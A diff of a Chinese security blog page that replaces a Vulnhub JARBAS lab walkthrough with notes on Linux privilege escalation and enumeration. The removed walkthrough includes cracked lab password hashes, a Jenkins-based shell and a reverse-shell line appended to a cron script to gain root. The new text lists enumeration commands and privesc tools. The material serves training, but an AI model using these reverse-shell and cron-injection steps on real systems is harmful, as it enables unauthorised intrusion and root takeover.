@@ -19,46 +19,22 @@
   <meta name="author" content="Jimi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="端口扫描 80 端口 8080 端口  dirb 目录爆破 dirb 进阶123456789格式：dirb &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]-a 设置user-agent-p &lt;proxy[:port]&gt;设置代理-c 设置cookie-z 添加毫秒延迟，避免洪水攻击-o 输出结果-X 在每个字典的后面添加一个后缀">
+    <meta name="description" content="权限体系： ugo suid	sgid capabilities AppArmor Selinux ACL 一些安全机制： Grsecurity Pax ExecShield ASLR TOMOYO Linux SMACK Yama CGroups Linux Namespaces stackGuard Proplice seccomp ptrace capsicum Mprotect chroo">
 <meta property="og:type" content="article">
-<meta property="og:title" content="vulnhub-JARBAS">
-<meta property="og:url" content="https://jimi-lab.github.io/2025/08/01/vulnhub-JARBAS/index.html">
+<meta property="og:title" content="提权原理和枚举">
+<meta property="og:url" content="https://jimi-lab.github.io/2025/07/06/%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86%E5%92%8C%E6%9E%9A%E4%B8%BE/index.html">
 <meta property="og:site_name" content="Jimi&#39;s blog">
-<meta property="og:description" content="端口扫描 80 端口 8080 端口  dirb 目录爆破 dirb 进阶123456789格式：dirb &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]-a 设置user-agent-p &lt;proxy[:port]&gt;设置代理-c 设置cookie-z 添加毫秒延迟，避免洪水攻击-o 输出结果-X 在每个字典的后面添加一个后缀">
+<meta property="og:description" content="权限体系： ugo suid	sgid capabilities AppArmor Selinux ACL 一些安全机制： Grsecurity Pax ExecShield ASLR TOMOYO Linux SMACK Yama CGroups Linux Namespaces stackGuard Proplice seccomp ptrace capsicum Mprotect chroo">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/1.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/2.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/3.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/4.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/5.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/6.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/7.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/8.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/9.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/10.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/11.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/12.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/13.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/14.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/15.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/16.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/17.png">
-<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/18.png">
-<meta property="article:published_time" content="2025-07-31T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-08-04T17:03:19.065Z">
+<meta property="article:published_time" content="2025-07-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-08-04T17:05:53.998Z">
 <meta property="article:author" content="Jimi">
-<meta property="article:tag" content="Vulnhub靶场">
-<meta property="article:tag" content="dirb">
-<meta property="article:tag" content="gobuster">
-<meta property="article:tag" content="hash-identifier">
-<meta property="article:tag" content="jenkins CMS">
-<meta property="article:tag" content="定时任务提权root">
+<meta property="article:tag" content="提权原理和枚举">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://jimi-lab.github.io/img/vulnhub-JARBAS.md/1.png">
   
   
   
-  <title>vulnhub-JARBAS - Jimi&#39;s blog</title>
+  <title>提权原理和枚举 - Jimi&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -228,7 +204,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="vulnhub-JARBAS"></span>
+            <span id="subtitle" data-typed-text="提权原理和枚举"></span>
           
         </div>
 
@@ -239,8 +215,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-08-01 00:00" pubdate>
-          2025年8月1日 凌晨
+        <time datetime="2025-07-06 00:00" pubdate>
+          2025年7月6日 凌晨
         </time>
       </span>
     
@@ -251,7 +227,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          195 字
+          194 字
         
       </span>
     
@@ -299,67 +275,59 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">vulnhub-JARBAS</h1>
+            <h1 id="seo-header">提权原理和枚举</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/../img/vulnhub-JARBAS.md/1.png"></p>
-<h3 id="80-端口"><a href="#80-端口" class="headerlink" title="80 端口"></a>80 端口</h3><p><img src="/../img/vulnhub-JARBAS.md/2.png"></p>
-<p>8080 端口</p>
-<p><img src="/../img/vulnhub-JARBAS.md/3.png"></p>
-<h4 id="dirb-目录爆破"><a href="#dirb-目录爆破" class="headerlink" title="dirb 目录爆破"></a>dirb 目录爆破</h4><p><img src="/../img/vulnhub-JARBAS.md/4.png"></p>
-<h5 id="dirb-进阶"><a href="#dirb-进阶" class="headerlink" title="dirb 进阶"></a>dirb 进阶</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">格式：dirb &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]<br>-a 设置user-agent<br>-p &lt;proxy[:port]&gt;设置代理<br>-c 设置cookie<br>-z 添加毫秒延迟，避免洪水攻击<br>-o 输出结果<br>-X 在每个字典的后面添加一个后缀<br>-H 添加请求头<br>-i 不区分大小写搜索<br></code></pre></td></tr></table></figure>
-
-<p><img src="/../img/vulnhub-JARBAS.md/5.png"></p>
-<h4 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h4><p><img src="/../img/vulnhub-JARBAS.md/6.png"></p>
-<h3 id="访问-access-html"><a href="#访问-access-html" class="headerlink" title="访问&#x2F;access.html"></a>访问&#x2F;access.html</h3><p><img src="/../img/vulnhub-JARBAS.md/7.png"></p>
-<p><img src="/../img/vulnhub-JARBAS.md/8.png"></p>
-<table>
-<thead>
-<tr>
-<th>user</th>
-<th>md5</th>
-<th>decrypt</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>tiago</td>
-<td>5978a63b4654c73c60fa24f836386d87</td>
-<td>italia99</td>
-</tr>
-<tr>
-<td>trindade</td>
-<td>f463f63616cb3f1e81ce46b39f882fd5</td>
-<td>marianna</td>
-</tr>
-<tr>
-<td>eder</td>
-<td>9b38e2b1e8b12f426b0d208a7ab6cb98</td>
-<td>vipsu</td>
-</tr>
-</tbody></table>
-<h3 id="进入系统"><a href="#进入系统" class="headerlink" title="进入系统"></a>进入系统</h3><p><img src="/../img/vulnhub-JARBAS.md/9.png"></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>框架利用了 jenkins</p>
-<p>新建 item</p>
-<p><img src="/../img/vulnhub-JARBAS.md/10.png"></p>
-<p><img src="/../img/vulnhub-JARBAS.md/11.png"></p>
-<h4 id="build"><a href="#build" class="headerlink" title="build"></a>build</h4><p><img src="/../img/vulnhub-JARBAS.md/12.png"></p>
-<p><img src="/../img/vulnhub-JARBAS.md/13.png"></p>
-<p>kali 开启监听</p>
-<p><img src="/../img/vulnhub-JARBAS.md/14.png"></p>
-<p><img src="/../img/vulnhub-JARBAS.md/15.png"></p>
-<p>得到 shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/../img/vulnhub-JARBAS.md/16.png"></p>
-<p>发现了一个每五分钟定期执行的sh脚本CleaningScript.sh</p>
-<p><img src="/../img/vulnhub-JARBAS.md/17.png"></p>
-<p>将以下代码写入该脚本中，再脚本执行的时候执行反弹 shell 命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash –i &gt;&amp; /dev/tcp/192.168.180.248/4443 0&gt;&amp;1&quot;</span> &gt;&gt; /etc/script/CleaningScript.sh<br></code></pre></td></tr></table></figure>
+                <p>权限体系：</p>
+<p>ugo</p>
+<p>suid	sgid</p>
+<p>capabilities</p>
+<p>AppArmor Selinux</p>
+<p>ACL</p>
+<p>一些安全机制：</p>
+<p>Grsecurity</p>
+<p>Pax</p>
+<p>ExecShield</p>
+<p>ASLR</p>
+<p>TOMOYO Linux</p>
+<p>SMACK</p>
+<p>Yama</p>
+<p>CGroups</p>
+<p>Linux Namespaces</p>
+<p>stackGuard</p>
+<p>Proplice</p>
+<p>seccomp</p>
+<p>ptrace</p>
+<p>capsicum</p>
+<p>Mprotect</p>
+<p>chroot</p>
+<p>firejail</p>
+<p>枚举：内网渗透</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">命令行<span class="hljs-built_in">tty</span><br>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span><br><span class="hljs-built_in">export</span> TERM=xterm-color<br></code></pre></td></tr></table></figure>
 
 
 
-<p>kali 建立监听，等待反弹 root shell 即可</p>
-<p><img src="/../img/vulnhub-JARBAS.md/18.png"></p>
+<h2 id="提权枚举"><a href="#提权枚举" class="headerlink" title="提权枚举"></a>提权枚举</h2><h3 id="1-手工枚举（不全，仅小记）"><a href="#1-手工枚举（不全，仅小记）" class="headerlink" title="1.手工枚举（不全，仅小记）"></a>1.手工枚举（不全，仅小记）</h3><p>用户：whoami | id | who | w | last </p>
+<p>内核：uname -a | lsb_release -a | cat &#x2F;proc&#x2F;version | cat &#x2F;etc&#x2F;issue | hostnamectl</p>
+<p>网络：ip addr | ifconfig | ip route | ip neigh | arp -a </p>
+<p>权限：sudo -l |  capabilities(getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null)</p>
+<p> 环境变量：echo $PATH | env</p>
+<p>进程：ps | ps -ef | ps axjf(查看进程数) | ps aux | top -n 1 | </p>
+<p>网络：netstat -a | netstat -at | netstat -au | netstat -l | netstat -s | netstat -ano</p>
+<p>whcih awk perl python ruby  gcc vi nmap find netcat nc wget tftp ftp tmux screen 2&gt;&#x2F;dev&#x2F;null(用 which 仅显示第一次找到的地方)</p>
+<p>cat &#x2F;etc&#x2F;fstab（未挂在的文件系统）</p>
+<h3 id="2-自动枚举"><a href="#2-自动枚举" class="headerlink" title="2.自动枚举"></a>2.自动枚举</h3><p>需要对扫描结果进行仔细的分析</p>
+<p>提权工具库：</p>
+<ul>
+<li>PEASS-ng</li>
+<li>LinEnum</li>
+<li>Linux-smart-enumeration</li>
+<li>Linux-exploit-suggester</li>
+<li>LinuxPrivchecker.py</li>
+<li>unix-privesc-check</li>
+</ul>
 
                 
               </div>
@@ -378,7 +346,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  <a href="/categories/Linux%E6%8F%90%E6%9D%83/" class="category-chain-item">Linux提权</a>
   
   
 
@@ -393,17 +361,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/Vulnhub%E9%9D%B6%E5%9C%BA/" class="print-no-link">#Vulnhub靶场</a>
-      
-        <a href="/tags/dirb/" class="print-no-link">#dirb</a>
-      
-        <a href="/tags/gobuster/" class="print-no-link">#gobuster</a>
-      
-        <a href="/tags/hash-identifier/" class="print-no-link">#hash-identifier</a>
-      
-        <a href="/tags/jenkins-CMS/" class="print-no-link">#jenkins CMS</a>
-      
-        <a href="/tags/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83root/" class="print-no-link">#定时任务提权root</a>
+        <a href="/tags/%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86%E5%92%8C%E6%9E%9A%E4%B8%BE/" class="print-no-link">#提权原理和枚举</a>
       
     </div>
   
@@ -415,8 +373,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>vulnhub-JARBAS</div>
-      <div>https://jimi-lab.github.io/2025/08/01/vulnhub-JARBAS/</div>
+      <div>提权原理和枚举</div>
+      <div>https://jimi-lab.github.io/2025/07/06/提权原理和枚举/</div>
     </div>
     <div class="license-meta">
       
@@ -428,7 +386,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年8月1日</div>
+          <div>2025年7月6日</div>
         </div>
       
       
@@ -460,9 +418,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/08/05/vulnhub-SickOS1.1/" title="vulnhub-SickOS1.1">
+                      <a href="/2025/07/15/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89/" title="深度学习教程（附源码）">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">vulnhub-SickOS1.1</span>
+                        <span class="hidden-mobile">深度学习教程（附源码）</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -470,8 +428,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/07/15/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89/" title="深度学习教程（附源码）">
-                        <span class="hidden-mobile">深度学习教程（附源码）</span>
+                      <a href="/2025/07/05/Linux%E6%8F%90%E6%9D%83%E6%8A%80%E5%B7%A7/" title="Linux提权技巧">
+                        <span class="hidden-mobile">Linux提权技巧</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
